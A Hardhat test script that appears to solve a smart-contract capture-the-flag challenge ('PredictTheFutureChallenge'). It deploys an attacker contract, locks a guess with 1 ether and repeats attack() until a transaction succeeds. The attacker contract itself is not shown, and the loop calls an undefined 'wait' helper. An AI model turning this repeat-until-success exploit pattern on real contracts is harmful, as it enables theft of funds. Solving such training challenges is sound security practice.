const {loadFixture} = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("PredictTheFutureChallenge", function () {

    // async function deployFixture() {
    //   const [owner] = await ethers.getSigners();
    //   const instance = await ethers.getContractAt("NicknameChallenge", "0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee");
 
    //   return { instance, owner };
    // }
     

    describe("Guessing", function () {
        it("Should Guess the random number", async function () {
            const [owner] = await ethers.getSigners();
            const instanceAddr = "0x380e7Da22690Ac8AC467AAe5bBd2cc5F9e75c080";
           
            const Attacker = await ethers.getContractFactory("PredictTheFutureAttacker");
            const attacker = await Attacker.deploy(instanceAddr);
            await attacker.deployed();

            console.log(`Deployed attacker at ${attacker.address}`)
           
            await attacker.connect(owner).lockGuess(0, {value: ethers.utils.parseEther("1")});
            
            let tx, receipt;

            while(true){
                tx = await attacker.connect(owner).attack();
                receipt = await wait(tx);
                if (receipt.status == 1) break; // Tx was successful.
            }
        });
    });


});
  